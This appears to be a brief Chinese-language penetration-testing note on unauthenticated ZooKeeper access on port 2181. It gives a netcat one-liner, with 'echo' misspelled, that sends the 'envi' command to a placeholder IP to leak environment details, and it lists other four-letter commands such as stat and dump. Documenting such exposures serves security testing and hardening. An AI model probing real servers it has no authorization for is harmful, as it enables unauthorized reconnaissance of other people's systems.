# Zookeeper 2181端口

## 关于

<a-checkbox checked>ZooKeeper是一个分布式的，开放源码的分布式应用程序协调服务，是Google的Chubby一个开源的实现，是Hadoop和Hbase的重要组件。它是一个为分布式应用提供一致性服务的软件，提供的功能包括：配置维护、域名服务、分布式同步、组服务等。</a-checkbox></br>

<a-checkbox checked>ZooKeeper默认开启在2181端口，在未进行任何访问控制情况下，攻击者可通过执行envi命令获得系统大量的敏感信息，包括系统名称、Java环境。</a-checkbox></br>

## 攻击方法

使用NC连接，并执行 envi 获取敏感信息

```bash
ehco envi | nc xxx.xxx.xxx.xxx 2181
```

![img](../../../.vuepress/public/img/1629282926633-640040a0-28a8-4488-89b3-0701a19dad61.png)

相关其他命令

```
stat：列出关于性能和连接的客户端的统计信息 
ruok：测试服务器是否运行在非错误状态。
reqs：列出未完成的请求
envi：打印有关服务环境的详细信息
dump：列出未完成的会话和临时节点
```

